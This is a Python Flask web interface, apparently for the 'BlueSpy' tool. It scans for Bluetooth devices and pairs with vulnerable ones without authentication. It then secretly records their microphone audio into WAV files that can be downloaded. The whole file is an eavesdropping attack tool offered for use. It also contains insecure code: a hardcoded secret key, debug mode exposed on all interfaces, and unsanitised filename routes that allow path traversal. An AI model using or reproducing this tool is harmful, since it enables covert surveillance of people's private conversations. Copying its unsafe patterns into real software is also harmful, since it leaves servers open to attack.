#!/usr/bin/env python3

from flask import Flask, render_template, request, jsonify, redirect, url_for, send_file
import os
import time
import threading
import json
from datetime import datetime
from core import BluezTarget, BluezAddressType, pair, connect, record, playback
from interface import log_info, log_warn
import subprocess

app = Flask(__name__)
app.config['SECRET_KEY'] = 'bluespy_secret_key'
app.config['UPLOAD_FOLDER'] = 'recordings'
app.config['SEND_FILE_MAX_AGE_DEFAULT'] = 0  # Disable caching for development

# Ensure recordings directory exists
if not os.path.exists(app.config['UPLOAD_FOLDER']):
    os.makedirs(app.config['UPLOAD_FOLDER'])

# Global variables
current_recording = None
recording_thread = None
is_recording = False
scan_results = []
connected_device = None

def scan_for_devices():
    """Scan for Bluetooth devices and return the results"""
    global scan_results
    scan_results = []
    
    try:
        # Run bluetoothctl scan
        process = subprocess.Popen(
            ['bluetoothctl', 'scan', 'on'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        # Let it scan for 10 seconds
        time.sleep(10)
        process.terminate()
        
        # Get the list of devices
        devices_process = subprocess.run(
            ['bluetoothctl', 'devices'],
            capture_output=True,
            text=True
        )
        
        device_lines = devices_process.stdout.strip().split('\n')
        for line in device_lines:
            if line.strip():
                parts = line.split(' ', 2)
                if len(parts) >= 3:
                    device_id = parts[1]
                    device_name = parts[2] if len(parts) > 2 else "Unknown"
                    scan_results.append({
                        'address': device_id,
                        'name': device_name
                    })
        
        return scan_results
    except Exception as e:
        print(f"Error scanning for devices: {e}")
        return []

def start_recording(target, filename):
    """Start recording audio from the target device"""
    global is_recording, current_recording
    
    is_recording = True
    current_recording = filename
    
    try:
        record(target, outfile=filename, verbose=True)
    except Exception as e:
        print(f"Error during recording: {e}")
    finally:
        is_recording = False


def stop_recording():
    """Stop the current recording"""
    global recording_thread, is_recording
    
    if recording_thread and recording_thread.is_alive():
        # Send keyboard interrupt to the recording thread
        is_recording = False
        # We rely on the KeyboardInterrupt handler in the record function
        
    return True

@app.route('/')
def index():
    """Main page"""
    return render_template('index.html')

@app.route('/scan', methods=['POST'])
def scan():
    """Scan for Bluetooth devices"""
    devices = scan_for_devices()
    return jsonify({'devices': devices})

@app.route('/connect', methods=['POST'])
def connect_device():
    """Connect to a Bluetooth device"""
    global connected_device
    
    data = request.json
    address = data.get('address')
    address_type = data.get('address_type', 'BR_EDR')
    
    if not address:
        return jsonify({'success': False, 'message': 'No device address provided'})
    
    try:
        # Convert address_type string to enum
        address_type_enum = BluezAddressType[address_type]
        target = BluezTarget(address, address_type_enum)
        
        # Try to pair with the device
        log_info(f"Attempting to pair with {address}...")
        paired = pair(target, verbose=True)
        
        if not paired:
            return jsonify({
                'success': False, 
                'message': 'Authentication error while trying to pair. The device probably is not vulnerable.'
            })
        
        # Connect to the device
        log_info(f"Establishing connection...")
        connect(target, verbose=True)
        
        # Wait for connection to establish
        time.sleep(3)
        
        connected_device = target
        return jsonify({
            'success': True, 
            'message': f'Successfully connected to {address}'
        })
        
    except Exception as e:
        return jsonify({'success': False, 'message': f'Error: {str(e)}'})

@app.route('/record', methods=['POST'])
def start_record():
    """Start recording from the connected device"""
    global recording_thread, is_recording, connected_device
    
    if not connected_device:
        return jsonify({'success': False, 'message': 'No device connected'})
    
    if is_recording:
        return jsonify({'success': False, 'message': 'Already recording'})
    
    # Generate filename with timestamp
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = os.path.join(app.config['UPLOAD_FOLDER'], f'recording_{timestamp}.wav')
    
    # Start recording in a separate thread
    recording_thread = threading.Thread(
        target=start_recording,
        args=(connected_device, filename)
    )
    recording_thread.daemon = True
    recording_thread.start()
    
    return jsonify({
        'success': True, 
        'message': 'Recording started',
        'filename': os.path.basename(filename)
    })

@app.route('/stop', methods=['POST'])
def stop_record():
    """Stop the current recording"""
    global is_recording
    
    if not is_recording:
        return jsonify({'success': False, 'message': 'Not recording'})
    
    success = stop_recording()
    
    if success:
        return jsonify({'success': True, 'message': 'Recording stopped'})
    else:
        return jsonify({'success': False, 'message': 'Failed to stop recording'})

@app.route('/disconnect', methods=['POST'])
def disconnect_device():
    """Disconnect from the Bluetooth device"""
    global connected_device
    
    if not connected_device:
        return jsonify({'success': False, 'message': 'No device connected'})
    
    try:
        # First ensure we're not recording
        if is_recording:
            stop_recording()
        
        # Use bluetoothctl to disconnect
        address = str(connected_device.address)
        subprocess.run(['bluetoothctl', 'disconnect', address], capture_output=True)
        
        # Reset the connected device
        connected_device = None
        
        return jsonify({'success': True, 'message': 'Device disconnected'})
    except Exception as e:
        return jsonify({'success': False, 'message': f'Error disconnecting: {str(e)}'})


@app.route('/recordings')
def list_recordings():
    """List all recordings"""
    recordings = []
    
    for filename in os.listdir(app.config['UPLOAD_FOLDER']):
        if filename.endswith('.wav'):
            file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
            file_stats = os.stat(file_path)
            recordings.append({
                'filename': filename,
                'size': file_stats.st_size,
                'created': datetime.fromtimestamp(file_stats.st_ctime).strftime('%Y-%m-%d %H:%M:%S')
            })
    
    return jsonify({'recordings': recordings})

@app.route('/sinks')
def get_sinks():
    """Get available audio sinks"""
    try:
        # Run pactl to get sinks
        process = subprocess.run(['pactl', 'list', 'sinks'], capture_output=True, text=True)
        output = process.stdout
        
        # Parse the output to get sink names
        sinks = []
        for line in output.split('\n'):
            if 'Name:' in line:
                sink_name = line.split('Name:')[1].strip()
                sinks.append(sink_name)
        
        return jsonify({'success': True, 'sinks': sinks})
    except Exception as e:
        return jsonify({'success': False, 'message': f'Error getting sinks: {str(e)}'})

@app.route('/play/<filename>')
def play_recording(filename):
    """Play a recording"""
    file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    
    if not os.path.exists(file_path):
        return jsonify({'success': False, 'message': 'File not found'})
    
    # Instead of playing directly, we'll serve the file for browser playback
    return send_file(file_path, mimetype='audio/wav')

@app.route('/player/<filename>')
def audio_player(filename):
    """Dedicated audio player page"""
    file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    
    if not os.path.exists(file_path):
        return redirect(url_for('index'))
    
    return render_template('player.html', filename=filename)

@app.route('/download/<filename>')
def download_recording(filename):
    """Download a recording"""
    file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    
    if not os.path.exists(file_path):
        return jsonify({'success': False, 'message': 'File not found'})
    
    return send_file(file_path, as_attachment=True)

@app.route('/delete/<filename>', methods=['POST'])
def delete_recording(filename):
    """Delete a recording"""
    file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    
    if not os.path.exists(file_path):
        return jsonify({'success': False, 'message': 'File not found'})
    
    try:
        os.remove(file_path)
        return jsonify({'success': True, 'message': 'File deleted'})
    except Exception as e:
        return jsonify({'success': False, 'message': f'Error deleting file: {str(e)}'})

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)